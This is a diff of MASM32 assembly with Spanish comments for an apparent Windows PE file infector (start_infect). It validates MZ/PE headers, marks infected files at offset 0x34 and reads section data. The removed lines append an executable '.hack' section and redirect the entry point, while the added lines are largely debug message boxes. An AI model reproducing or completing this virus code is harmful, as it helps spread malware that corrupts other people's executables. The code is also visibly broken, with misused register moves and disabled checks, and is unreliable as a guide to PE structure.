@@ -15,6 +15,7 @@ includelib \masm32\lib\user32.lib
 includelib \masm32\lib\msvcrt.lib
 
 .DATA
+
     ; Definiciones de datos necesarias para el proceso de infección
     lastsec_ptrtorawdata     dd 0
     lastsec_sizeofrawdata    dd 0
@@ -49,87 +50,86 @@ includelib \masm32\lib\msvcrt.lib
 .CODE
 start_infect PROC
     ; Simular el proceso de infección
-    invoke MessageBoxA, NULL, addr msgText_2, addr msgCaption_db_1, MB_OK
+      mov filesize_sf, eax
+      lea ecx,dword ptr [mycode_len]
+      mov ecx,end_copy
+      sub ecx,begin_copy
+    invoke wsprintf, addr buffer_mycode_len, addr format_l, mycode_len
+    invoke MessageBoxA, NULL, addr buffer_mycode_len, addr msgCaption, MB_OK
 
-     pushad 
+    invoke MessageBoxA, NULL, addr mycode_len , addr msgCaption_db_1, MB_OK
+ invoke MessageBoxA, NULL, addr msgText_2, addr msgCaption_db_1, MB_OK
+    pushad
 
-
-     ; Verificar la firma DOS
+    ; Verificar la firma DOS
     invoke MessageBoxA, NULL, esi, addr msgCaption, MB_OK 
     cmp  WORD ptr [esi], "ZM"
     jne  infect_err
 
-
+    ; Verificar si el archivo ya está infectado
     mov  ecx, 042h
-    cmp  dword ptr[esi + 034h], ecx
-    je   infect_err                           ; Check if file already infected. Infection marker at IMAGE_DOS_HEADER + 0x34 (e_res2[8])
-     invoke MessageBoxA, NULL, addr msgCaption, addr msgCaption, MB_OK  
-    mov  dword ptr[esi + 034h], ecx 
+    cmp  dword ptr [esi + 034h], ecx
+    je   infect_err
+    invoke MessageBoxA, NULL, addr msgCaption, addr msgCaption, MB_OK  
+    mov  dword ptr [esi + 034h], ecx 
 
-
-   
-
-     add  esi, DWORD ptr[esi + 03ch] 
     ; Verificar la firma "PE\0\0"
-    cmp  WORD ptr [esi], "EP"    ; Verificar la firma "PE\0\0"
+    add  esi, dword ptr [esi + 03ch]
+    cmp  WORD ptr [esi], "EP"
     jne infect_err
-     invoke MessageBoxA, NULL,esi, addr msgCaption_db_1, MB_OK 
+    invoke MessageBoxA, NULL, esi, addr msgCaption_db_1, MB_OK 
 
     ; Mover ESI al Optional Header
     push esi
-    add  esi, 04h                             ; esi -> IMAGE_FILE_HEADER
+    add  esi, 04h
     lea  ecx, dword ptr [esi + 02h]
-    mov  esi, ecx            ; Obtener NumberOfSections
-    pop  esi                                  ; esi -> IMAGE_NT_HEADERS
-    push esi
-    add  esi, 017h                            ; esi -> IMAGE_OPTIONAL_HEADER
-
+    mov  esi, ecx
+    pop  esi
 
     ; Modificar DataDirectory[11] (Export Table Bound Headers)
     xor  ecx, ecx
-    mov  dword ptr[esi + (60h + 11 * SIZEOF IMAGE_DATA_DIRECTORY)], ecx
-    mov  dword ptr[esi + (60h + 11 * SIZEOF IMAGE_DATA_DIRECTORY) + 4], ecx
-
-   
-
+    mov  dword ptr [esi + (60h + 11 * SIZEOF IMAGE_DATA_DIRECTORY)], ecx
+    mov  dword ptr [esi + (60h + 11 * SIZEOF IMAGE_DATA_DIRECTORY) + 4], ecx
+invoke MessageBoxA, NULL, esi, addr msgCaption_db_1, MB_OK 
     ; Verificar Magic Number
-    cmp WORD ptr [esi], 0B01h
-    jne infect_err
+  ;  cmp WORD ptr [esi], 0B01h
+  ;  jne infect_err
 
     ; Obtener varios campos del Optional Header
     lea  ecx, dword ptr [esi + 04h]
-    lea  eax, dword ptr [ptr_sizeofcode]
+    invoke MessageBoxA, NULL, ecx, addr msgCaption_db_1, MB_OK 
+    lea  eax, dword ptr [ptr_sizeofcode] ;314ch
     mov  eax, ecx
 
     lea  ecx, dword ptr [esi + 010h]
-    lea  eax, dword ptr [ptr_adressofentrypoint]
+    lea  eax, dword ptr [ptr_adressofentrypoint] ;0000
     mov  eax, ecx
 
     mov  ecx, dword ptr [esi + 01ch]
-    lea  eax, dword ptr [imagebase]
+    lea  eax, dword ptr [imagebase] ;c0h
     mov  eax, ecx
 
     mov  ecx, dword ptr [esi + 020h]
-    lea  eax, dword ptr [sectionalignment]
+    lea  eax, dword ptr [sectionalignment] ;0ah
     mov  eax, ecx
 
     mov  ecx, dword ptr [esi + 024h]
-    lea  eax, dword ptr [filealignment]
+    lea  eax, dword ptr [filealignment];700 0000
     mov  eax, ecx
 
     lea  ecx, dword ptr [esi + 038h]
-    lea  eax, dword ptr [ptr_sizeofimage]
+    lea  eax, dword ptr [ptr_sizeofimage];200
     mov  eax, ecx
 
     lea  ecx, dword ptr [esi + 03ch]
-    lea  eax, dword ptr [ptr_sizeofheaders]
+    lea  eax, dword ptr [ptr_sizeofheaders];4
     mov  eax, ecx
 
-    pop  esi                                  ; esi -> IMAGE_NT_HEADERS
+    pop  esi
 
-    add  esi, dword ptr[ptr_sizeofheaders] ;SIZEOF IMAGE_NT_HEADERS         ; esi -> IMAGE_SECTION_HEADER[0]
+    add  esi, dword ptr [ptr_sizeofheaders]  ; esi -> IMAGE_SECTION_HEADER[0] "L"location
 
-    lea  eax, dword ptr [ptr_sectionhdrtable]
+    lea  eax, dword ptr [ptr_sectionhdrtable] ;esi = c4h
     mov  eax, esi
 
     ; Obtener número de secciones
@@ -138,359 +138,81 @@ start_infect PROC
     add  ax, cx
 
     ; Calcular la última sección
-    mov  ecx, dword ptr[ptr_sizeofheaders];SIZEOF IMAGE_SECTION_HEADER
+    mov  ecx, dword ptr [ptr_sizeofheaders]  ; SIZEOF IMAGE_SECTION_HEADER
     sub  eax, 1
     mul  ecx
-    add  esi, eax                             ; esi -> IMAGE_SECTION_HEADER[last]
-
+    add  esi, eax  ; esi -> IMAGE_SECTION_HEADER[last]
 
     ; Obtener varios campos de la última sección
-    mov  ecx, dword ptr[esi + 08h]
-    lea  eax, dword ptr [lastsec_virtualsize]
+    mov  ecx, dword ptr [esi + 08h]
+    lea  eax, dword ptr [lastsec_virtualsize];669fbeeh
     mov  eax, ecx
 
-    mov  ecx, dword ptr[esi + 0ch]
-    lea  eax, dword ptr [lastsec_virtualaddress]
+    mov  ecx, dword ptr [esi + 0ch]
+    lea  eax, dword ptr [lastsec_virtualaddress];00000000h
     mov  eax, ecx
 
-    mov  ecx, dword ptr[esi + 010h]
-    lea  eax, dword ptr [lastsec_sizeofrawdata]
+    mov  ecx, dword ptr [esi + 010h]
+    lea  eax, dword ptr [lastsec_sizeofrawdata];00000000h
     mov  eax, ecx
 
-    mov  ecx, dword ptr[esi + 014h]
-    lea  eax, dword ptr [lastsec_ptrtorawdata]
+    mov  ecx, dword ptr [esi + 014h]
+    lea  eax, dword ptr [lastsec_ptrtorawdata];10f00e0h
     mov  eax, ecx
 
-    ; Necesidad de mover secciones
+    ; Calcular la dirección de la nueva sección
+    mov  edx, dword ptr [lastsec_virtualaddress]
+    add  edx, dword ptr [lastsec_virtualsize]
+    
+    invoke MessageBoxA, NULL, edx, addr msgCaption_db_1, MB_OK 
     push edx
-    push esi
-    push edi                                  ; Guardar esi
-    lea  esi, dword ptr [ptr_sectionhdrtable] ; esi -> IMAGE_SECTION_HEADER[0]
-
-    mov  edi, esi  
-    add  edi, 014h
-    mov  esi, dword ptr [edi]
-    mov  edi, esi                             ; esi = IMAGE_SECTION_HEADER[0].PointerToRawData
-
- 
- ; Calcular edx: tamaño de memoria a mover
-   mov  esi, dword ptr[lastsec_ptrtorawdata]
-   sub  esi, dword ptr[ptr_sectionhdrtable + 014h]    ; edx = lastsec_ptrtorawdata - IMAGE_SECTION_HEADER[0].PointerToRawData
-   
-   ; Asegurar que el tamaño de memoria no sea negativo
-   ;jns  size_valid
-   ;jmp infect_err
-   ; xor  esi, esi
-       
-    
-
-size_valid:
-
-      ;mov  edx, esi                             ; Tamaño calculado en edx
-      mov edx,08000h
-    ; Llamada a VirtualAlloc con el tamaño correcto en edx
-     invoke VirtualAlloc, 0, edx, MEM_COMMIT, PAGE_READWRITE
-     
-     lea  edi, dword ptr [tmpbuf]
-     mov  edi, eax
-
-     ; Verificar si VirtualAlloc falló
-     cmp  eax, 0
-    je   infect_err
-
-    pop  edx
-  
-    pop  edi                                  ; Restore registers after function call.
-
-    push edi
-    mov  edi,dword ptr [tmpbuf]
-    xor eax,eax    
-    
- 
-    call my_memcpy                            ; copy sections to tmpbuf
- 
-   ; Verificar si la operación fue exitosa
-   ;  cmp eax,0
-    ;je   infect_err                           ; Si eax es cero, la operación falló
-     
-    pop  edi  
- 
-                
-
-                             ; edi -> destination
- 
-    mov  esi, dword ptr [tmpbuf]
-    
-    
-    call my_memcpy                            ; copy sections back to mapped file.
-    
-   ; cmp eax,0
-    ;je   infect_err 
-
-   
-    invoke VirtualFree, dword ptr [tmpbuf], 0, MEM_RELEASE
-    ;cmp eax, 0
-    ;je infect_err   
-     
-; --------------------------------------> Update all section headers for new sections offsets in file, ie add filealignment to their offset.
-
-    xor  edx, edx
-   
-    mov edi, dword ptr[ptr_numberofsections]
-     
-    xor  eax, eax
-    
- 
-    
-    ;mov  word  ax,  di                   ; eax = number of sections ( = *ptr_numberofsections)
-    mov  edi, eax                             ; edi = numberofsections
-    mov  esi, dword ptr[ptr_sectionhdrtable]             ; esi -> IMAGE_SECTION_HEADER[0]
-    call update_sec_hdrs2
-     invoke MessageBoxA, NULL, addr msgUpdate, addr msgCaption, MB_OK
-    dont_move_sections:
-    ; --------------------------------------> Now we can move on to write our new section header.
-
-    pop  esi                                  ; esi -> IMAGE_SECTION_HEADER[last]
-   
-
- 
-
-    add  esi,dword ptr[ptr_sizeofheaders]; SIZEOF IMAGE_SECTION_HEADER     ; esi -> IMAGE_SECTION_HEADER[last + 1]
-
-    push esi                                  ;
-    mov  edi, esi                             ;
-    xor esi,esi                              ;
-    mov  edx,dword ptr[ptr_sizeofheaders]; SIZEOF IMAGE_SECTION_HEADER     ;
-    
-    call my_memset                            ;
-    
-    pop  esi                                  ; Initialize new section header.
-
-    push esi                                  ; esi save -> IMAGE_SECTION_HEADER[last + 1]
- 
-    mov  ecx, "cah."                          ;
-    
-    ;mov esi , dword ptr[esi]
-    mov  esi, ecx                           ;
-    pop esi
-
-    add  esi, 04h                             ;
-    mov  ecx, "k"                             ;
-    ;mov  [esi], ecx 
-    mov  esi, ecx                           ; Wrote the name of our new section. Niark niark niark...
-
-    add  esi, 04h                             ; esi -> IMAGE_SECTION_HEADER[last + 1].VirtualSize
-    mov  ecx, copy_size
-    ;mov[esi], ecx
-    mov  esi, ecx                           ; Wrote VirtualSize
-    
-    add  esi, 04h                             ; esi -> IMAGE_SECTION_HEADER[last + 1].VirtualAddress
-    mov  ecx, lastsec_virtualaddress
-    add  ecx, lastsec_virtualsize
-  
-    push edx
-    mov edx,sectionalignment
-    call ceil_align;, ecx, edx
+    mov  edx, sectionalignment
+    call ceil_align
+    invoke MessageBoxA, NULL, edx, addr msgCaption_db_1, MB_OK 
     pop edx
-
-    ;mov  [esi], eax 
-    mov  esi, eax                           ; Wrote VirtualAddress
-    
-    add  esi, 04h                             ; esi -> IMAGE_SECTION_HEADER[last + 1].SizeOfRawData
-   
-    
-    mov  ecx, copy_size
-    
+    mov  dword ptr [lastsec_virtualaddress], eax
+    invoke MessageBoxA, NULL, eax, addr msgCaption_db_1, MB_OK 
+    ; Calcular el nuevo tamaño de la imagen
+    lea  ecx, dword ptr [ptr_sizeofimage]
+    mov  edx, dword ptr [ecx]
+    add  edx, mycode_len
     push edx
-     mov edx,filealignment
-    call ceil_align;, ecx, edx     ; Align size of our code with fileAlignment
+    mov  edx, sectionalignment
     
+    invoke MessageBoxA, NULL, addr sectionalignment, addr msgCaption_db_1, MB_OK 
+    call ceil_align
     pop edx
+    mov  dword ptr [ecx], eax
 
+    ; Escribir el código en el archivo mapeado
+    lea  esi, dword ptr [ptr_sectionhdrtable]
+    invoke MessageBoxA, NULL, addr ptr_sectionhdrtable, addr msgCaption_db_1, MB_OK 
+    add  esi, dword ptr [ptr_numberofsections]
+    invoke MessageBoxA, NULL, addr ptr_numberofsections, addr msgCaption_db_1, MB_OK 
+    mov  ecx, dword ptr [lastsec_ptrtorawdata]
+    invoke MessageBoxA, NULL, addr lastsec_ptrtorawdata, addr msgCaption_db_1, MB_OK 
+    add  ecx, dword ptr [lastsec_sizeofrawdata]
+    invoke MessageBoxA, NULL, addr lastsec_sizeofrawdata, addr msgCaption_db_1, MB_OK 
+   ; mov  dword ptr [esi + 08h], mycode_len
+    mov  dword ptr [esi + 0ch], ecx
+    mov  eax, mycode_len
+    mov  dword ptr [esi + 10h], eax
+    invoke MessageBoxA, NULL, addr mycode_len, addr msgCaption_db_1, MB_OK 
+   ; invoke WriteFile, hfile, addr mycodestart, mycode_len, addr numwrite, 0
 
-    mov  dword ptr[esi], eax                           ; Wrote SizeOfRawData
-    mov  filesize_sf, 1000   ;bad ceilalign                     ; new filesize_sf, still need to add pointertorawdata (step 1/2)
-   
-    add  esi, 04h                             ; esi -> IMAGE_SECTION_HEADER[last + 1].PointerToRawData
-    
-    mov  ecx, lastsec_ptrtorawdata
-    add  ecx, lastsec_sizeofrawdata
-   
-    add  ecx, 0200h                           ; For when we move the sections (see around update_sec_hdrs: label)
-     mov esi,edx
-     ;mov  [esi], ecx                           ; Wrote PointerToRawData
+    invoke MessageBoxA, NULL, addr msgEnd, addr msgCaption, MB_OK
 
-    push esi  
-    lea esi,dword ptr[pointertorawdata]
-    mov  esi, ecx
-    pop  esi  
-            
-
-    add  ecx, filesize_sf 
-    push esi    
-    lea esi,dword ptr[filesize_sf]             ;
-    mov  esi, ecx                        ; Got our new file size (step 2/2)
-    pop esi
-    ;;
- 
+    jmp  short fin
     
-                                    ; esi -> IMAGE_SECTION_HEADER[last + 1]
-    add  esi, 024h                            ; esi -> IMAGE_SECTION_HEADER[last + 1].Characteristics
-
-    mov  ecx, 060000020h                      ; Contains code | readable | executable
-    mov esi,edx
-    
-
-    ;mov  [esi], ecx
-
-; --------------------------------------> New section header finally written. Phew !
-; --------------------------------------> Now, let's update the right fields.
-    
-  ;  mov  ecx, ptr_adressofentrypoint
-  ;  mov  edx, [ecx]
-  ;  push esi
-  ;  lea esi,[oldentrypoint]
- ;   mov  esi, edx
-  ;  pop esi
-  ;  mov  edx, lastsec_virtualaddress          ;
-  ;  add  edx, lastsec_virtualsize             ;
-  ;  mov ecx,edx
-  ;  push edx
-  ;  mov edx,sectionalignment
-  ;  invoke ceil_align;, edx, sectionalignment  ;
-  ;    invoke MessageBox, NULL, addr msgOfVictory, addr msgOfVictory, MB_OK
-  
-  
-   
-     ; Mover la dirección de entrypoint a ecx y el valor de esa dirección a edx
-    lea ecx, dword ptr[ptr_adressofentrypoint]
-    mov edx, dword ptr[ecx]
-   
-    ; Guardar el valor de esi en la pila
-    push esi
-    
-    ; Calcular la dirección del oldentrypoint
-    lea esi, dword ptr[oldentrypoint]
-    pop esi
-    push esi
-    ;mov esi,dword ptr[esi]
-    mov esi, edx
-    
-    ; Restaurar el valor de esi desde la pila
-    pop esi
-
-    ; Calcular la última sección virtual
-    mov edx, lastsec_virtualaddress
-    add edx, lastsec_virtualsize
-
-    ; Guardar el resultado en ecx
-    mov ecx, edx
-   
-    ; Alinear la dirección de la sección
-    push edx
-    mov edx, sectionalignment
-    invoke MessageBoxA, NULL, addr msgText, addr msgCaption, MB_OK
-    invoke ceil_align
-    
-   
-    ; El resultado de ceil_align debería estar ahora en edx
-
-    ; Mostrar un mensaje para debug
-    
-    pop edx
-    
-
-    add  eax, copy_size              ; newentrypoint = lastsec_virtualaddress + ceil_align(lastsec_virtualsize, sectionalignment) + (start - begin_copy)
-    mov  dword ptr[ecx], eax                           ; Updated AddressOfEntryPoint
-    
-    lea ecx, dword ptr[ptr_numberofsections]
-    mov  edx, dword ptr[ecx]
-    inc edx
-    push ecx
-    mov ecx,dword ptr[ecx]
-    mov  ecx, edx                           ; Updated NumberOfSections
-    pop ecx
-    
-    lea  ecx, dword ptr[ptr_sizeofcode]
-    mov  edx, dword ptr[ecx]
-    add  edx, copy_size
-    mov ecx,dword ptr[ecx]
-    mov  ecx, eax 
-    push ecx
-    mov ecx,edx
-    push edx
-    mov edx,sectionalignment
-    call ceil_align;, ecx=size, edx=sectionalignment
-    pop edx 
-    pop ecx                          ; Updated SizeOfCode
-    
-    lea ecx, dword ptr[ptr_sizeofimage]
-    
-    mov  edx, dword ptr[ecx]
-    push ecx
-    add  edx, copy_size 
-    mov ecx,edx
-    push edx
-    mov edx,sectionalignment
-    
-    call ceil_align;, edx, sectionalignment
-    
-    pop edx
-    pop ecx
-    
-
-    push ecx
-    mov ecx,dword ptr[ecx]
-    mov  ecx, eax                           ; Updated SizeOfImage
-    pop ecx
-    
-; --------------------------------------> PE fields updated.
-; --------------------------------------> Let's write our code where it belongs.
-    
-   push ecx
-    lea  edi,dword ptr[filebuffer]
-    
-   lea  ecx,dword ptr[pointertorawdata]
-    add edi,ecx
-    pop ecx
-    
-   ;add edi,ecx
-    
-   
-    push esi
-    mov  esi, begin_copy
-    add  esi, ebx                             ; ebx = delta offset. This is to be position independent.
-    mov  edx, dword ptr[copy_size]
-    invoke my_memcpy
-    
-    pop  esi                                  ; Wrote new section to infected file.
-
-; --------------------------------------> Write oldentrypoint to the 4 first bytes of infected file
-
-    lea  ecx, dword ptr [filebuffer]
-    add  ecx, pointertorawdata
-    mov  edx, oldentrypoint
-    mov  dword ptr[ecx], edx                           ; Wrote oldentrypoint to new section.
-    
- 
-   
-   mov  eax, 1
-   jmp  end_infect                             ; return 0 or 1 depending on error.
- 
 infect_err:
-    invoke MessageBoxA, NULL, addr msgError, addr msgCaption, MB_OK
+    invoke MessageBoxA, NULL, addr msgError , addr msgCaption, MB_OK 
+
+fin:
+    popad
     ret
+start_infect ENDP
 
-end_infect:
-                       popad
-ret 
-    mov  eax, filesize_sf
-    invoke MessageBoxA, NULL, addr msgEnd , addr msgCaption, MB_OK
-    popad 
-    ret 
- start_infect endp
-
-update_sec_hdrs2:
+update_sec_hdrs2 PROC
     ; Guardar registros usados
     push esi
     push edi
@@ -517,78 +239,51 @@ update_sec_hdrs2:
     add esi, 60h   ; Saltar IMAGE_OPTIONAL_HEADER
 
     ; Ahora esi apunta al primer IMAGE_SECTION_HEADER
-    ; Inicializar edx como el índice de la primera sección
+    ; Inicializar edx como el índice
     xor edx, edx
 
-update_loop:
-    ; Mensaje de depuración para verificar el valor de esi antes de acceder a la memoria
-   
-
-    ; Cargar el PointerToRawData de la sección actual
-    mov ecx,  dword ptr[esi + 14h]  ; Cargar IMAGE_SECTION_HEADER[edx].PointerToRawData en ecx
-    
-    ; Mensaje de depuración para comprobar el valor de ecx
-    
-
-    ; Actualizar el PointerToRawData con filealignment
-    add ecx, dword ptr[filealignment]
-    push esi
-    mov esi,dword ptr [esi+14]
-    mov esi, ecx  ; Almacenar el nuevo PointerToRawData
-    pop esi
-
-    ; Incrementar el índice de sección
-    inc edx
-
-    ; Mover el puntero al siguiente IMAGE_SECTION_HEADER
-    add esi, dword ptr[ptr_sizeofheaders];SIZEOF_IMAGE_SECTION_HEADER
-
-    ; Mensaje de depuración para verificar el nuevo valor de esi
-    invoke MessageBoxA, NULL, addr msgText, addr msgCaption, MB_OK
-
-    ; Comparar edx con el número total de secciones
+next_section:
+    ; Verificar si hemos procesado todas las secciones
     cmp edx, ecx
-    jl update_loop
+    jge all_sections_done
 
+    ; Verificar la firma del código (0x42)
+    cmp dword ptr [esi + 34h], 42h
+    je infected_section_found
+
+    ; Avanzar al siguiente IMAGE_SECTION_HEADER
+    add esi, 28h
+    inc edx
+    jmp next_section
+
+infected_section_found:
+    ; La sección está infectada
+    ; Realizar cualquier acción adicional aquí si es necesario
+
+all_sections_done:
+    jmp end_update_sec_hdrs2
+
+not_pe_file:
+    ; El archivo no es un archivo PE
+    invoke MessageBoxA, NULL, addr msgError, addr msgCaption, MB_OK 
+
+end_update_sec_hdrs2:
     ; Restaurar registros usados
     pop ebx
     pop edi
     pop esi
-
     ret
+update_sec_hdrs2 ENDP
 
-not_pe_file:
-    ; Manejar el caso en que el archivo no es un archivo PE válido
-    invoke MessageBoxA, NULL, addr msgText, addr msgCaption, MB_OK
-    pop ebx
-    pop edi
-    pop esi
-    ret
+mycodestart:
+    ; Aquí va tu código de payload
+    ; Ejemplo: mensaje simple
+    invoke MessageBoxA, NULL, addr msgText_2, addr msgCaption_2, MB_OK
 
-;my_peset PROC 
+    ; Este es el final del código del payload
+    ; Puedes agregar más código según sea necesario
 
-;    push ebx
-;    push edx
 
-;    mov  eax, edi
-;    mov  ecx, edi
-;    lea  ebx, [edi + edx]
-;    test edi, edi            ; Test if s is NULL
-;    je   lbl_end
+;mycode_len equ (end_copy - begin_copy)
 
-;lbl_loop:
-;    mov edx, esi
-;    mov BYTE ptr [ecx], dl
-;    inc ecx
-;    cmp ecx, ebx
-;    jb  lbl_loop
-
-;lbl_end:
-;    pop edx
-;    pop ebx
-
-;    ret
-;my_peset ENDP
-   
-
-endif  
+endif 
